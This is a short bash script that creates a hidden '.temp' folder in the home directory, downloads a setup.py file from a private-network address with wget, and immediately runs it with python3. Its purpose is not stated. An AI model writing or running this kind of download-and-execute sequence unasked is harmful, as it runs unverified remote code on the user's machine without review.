# !/bin/bash

mkdir $HOME/.temp/

wget 192.168.20.14/repository/setup.py -P $HOME/.temp/

python3 $HOME/.temp/setup.py

